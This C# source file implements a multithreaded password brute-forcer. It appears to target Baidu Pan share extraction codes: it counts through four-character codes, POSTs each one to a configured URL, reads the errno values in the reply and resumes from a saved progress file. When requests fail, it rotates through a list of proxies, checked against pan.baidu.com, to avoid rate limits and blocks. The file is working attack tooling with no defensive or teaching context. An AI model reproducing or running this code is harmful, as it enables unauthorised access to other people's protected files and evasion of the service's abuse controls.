using System;
using System.IO;
using System.Net;
using System.Timers;

namespace zgcwkj
{
    public class HttpThread
    {
        private Main myMain;//主窗体
        private int StartValue = 0;//基值
        private int NumberValue = 0;//剩余次数
        private Timer timer;//线程
        private string ThreadID;//线程ID

        private WebProxy webProxy;//代理 实体
        private string[] webProxyIP;//代理 IP组
        private int webProxyBout;//代理 次/回

        /// <summary>
        /// http请求线程类
        /// </summary>
        /// <param name="main">主窗体</param>
        /// <param name="name">线程名称</param>
        /// <param name="start">开始值</param>
        /// <param name="number">结束值</param>
        /// <param name="interval">线程速度</param>
        public HttpThread(Main main, string name, int start, int number, int interval)
        {
            myMain = main;
            StartValue = start;
            NumberValue = number;
            ThreadID = StaticClass.file + "/" + name;
            timer = new Timer(interval);
        }

        /// <summary>
        /// 启动线程
        /// </summary>
        /// <returns></returns>
        public HttpThread Start()
        {
            #region 载入历史参数

            try
            {
                if (File.Exists(ThreadID + ".ini"))
                {
                    string _start = File.ReadAllText(ThreadID + ".ini");
                    if (_start != "") StartValue = Convert.ToInt32(_start);
                }
            }
            catch { }

            #endregion 载入历史参数

            timer.Elapsed += new ElapsedEventHandler(_Timer);
            timer.Start();
            return this;
        }

        private void _Timer(object sender, ElapsedEventArgs e)
        {
            Timer timer = sender as Timer;
            if (NumberValue < StartValue || StaticClass.status)
            {
                #region 保存历史参数

                try
                {
                    File.WriteAllText(ThreadID + ".ini", StartValue.ToString());
                }
                catch { }

                #endregion 保存历史参数

                timer.Stop();
            }
            else
            {
                string password = Hash.HashTo4Str(StartValue);
                HttpTest httptest = new HttpTest(StaticClass.url);
                string html = httptest.Post(password, webProxy);
                myMain.ModifyStr(html, password);

                if (html.Contains("\"errno\":0")) { }
                else if (html.Contains("\"errno\":-9")) StartValue = StartValue + 1;
                else if (html.Contains("\"errno\":-62")) StartValue = StartValue + 1;
                else ProxyWeb();
            }
        }

        /// <summary>
        /// 代理 WEB
        /// </summary>
        private void ProxyWeb()
        {
            //判断是否启动代理服务
            if (!myMain.cB_proxy.Checked) { return; }

            //判断IP组是否有数据
            if (webProxyIP == null) { webProxyIP = File.ReadAllText(StaticClass.proxy).Replace("\r", "").Split('\n'); }

            string ip_port = webProxyIP[webProxyBout];
            int indexof = ip_port.IndexOf(":");
            string ip = ip_port.Substring(0, indexof);
            string port = ip_port.Substring(indexof + 1, ip_port.Length - indexof - 1);

            webProxy = new WebProxy(ip, Convert.ToInt32(port));

            try
            {
                WebClient webClient = new WebClient();
                webClient.Proxy = webProxy;
                byte[] bytes = webClient.DownloadData("https://pan.baidu.com");
                string html = System.Text.Encoding.Default.GetString(bytes);
            }
            catch (Exception e)
            {
                string message = e.Message;
                if (webProxyBout < webProxyIP.Length - 1) webProxyBout++; else webProxyBout = 0;
            }
        }
    }
}